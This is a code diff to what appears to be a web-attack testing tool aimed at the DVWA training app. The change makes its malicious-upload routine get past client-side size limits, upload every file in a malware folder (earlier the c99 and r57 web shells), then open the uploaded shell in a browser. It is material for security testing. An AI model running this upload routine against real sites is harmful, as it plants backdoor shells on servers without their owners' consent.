@@ -26,6 +26,8 @@ import base64
 import difflib
 import hashlib
 import webbrowser
+import os
+import glob
 import funcs
 import vars
 import wafw00f
@@ -1048,7 +1050,6 @@ class DVWAAttacks:
         print
     # EOF
 
-
     """
         attackupload covers areas of:
         OWASP Top 10 - A1: Injection
@@ -1063,7 +1064,11 @@ class DVWAAttacks:
             Looks something like:
             [{'FileControl': 'uploaded', 'HiddenControl': {'MAX_FILE_SIZE': '100000'}}]
         """
-        attackfilename = ["c99.php", "r57.php","eicar.com"]
+        #attackfilename = ["c99.php", "r57.php","eicar.com"]
+        attackfilename = []
+        for infile in glob.glob(os.path.join(vars.getMalwarePath(), '*')):
+            attackfilename.append(infile)
+
         uploadsuccesstr = "succesfully"
         regUploadSuccess = re.compile(uploadsuccesstr,re.I+re.MULTILINE)
         results = []
@@ -1073,42 +1078,47 @@ class DVWAAttacks:
         attackform = funcs.doFormDiscovery(fp, targetpage)
         if attackform:
             for f in attackfilename:
+                fName = f.split('/')[1]
+                resp = ""
+                vars.typecount['upload'][0] += 1
                 try:
                     fp.open(targetpage)
                     fp.select_form(nr=0)
                     for k,v in attackform[0]['HiddenControl'].items():
                         # modify hidden fields
                         fp.find_control(k).readonly = False
-                        # alter the accepted body size since it
-                        # is enforced client-side
+                        '''
+                            alter the accepted body size since it
+                            is enforced client-side
+                        '''
                         fp[k] = '1000000000'
     
-                    filehandle = open(mpath + f)
-                    fp.form.add_file(filehandle, None, f)
+                    #filehandle = open(mpath + f)
+                    filehandle = open(f)
+                    fp.form.add_file(filehandle, None, fName)
                     fp.submit()
-                    vars.typecount['upload'][0] += 1
                     resp = fp.response().read()
                 except:
                     pass
 
                 if regUploadSuccess.search(resp):
-                    results.append("%s shell uploaded" % f[0:3])
+                    results.append("%s shell uploaded" % fName)
                     """
                         malicious backdoor shell has been uploaded,
                         now open this up in a browser to display it
                     """
                     if vars.getUseBrowser():
                         try:
-                            webbrowser.open(self.url + self.apppath + self.uploadpath + f, new=2, autoraise=True)
+                            webbrowser.open(self.url + self.apppath + self.uploadpath + fName, new=2, autoraise=True)
                         except webbrowser.Error:
-                            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % self.url + self.apppath + self.uploadpath + f)
+                            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % self.url + self.apppath + self.uploadpath + fName)
                     vars.typecount['upload'][1] += 1
                     self.htmlgen.writeHtmlTableCell(success=True, attackType="Malicious Upload",
-                                                    target=targetpage, vect=f)
+                                                    target=targetpage, vect=fName)
                 else:
                     vars.typecount['upload'][2] += 1
                     self.htmlgen.writeHtmlTableCell(success=False, attackType="Malicious Upload",
-                                                    target=targetpage, vect=f)
+                                                    target=targetpage, vect=fName)
         
         else:
             return None
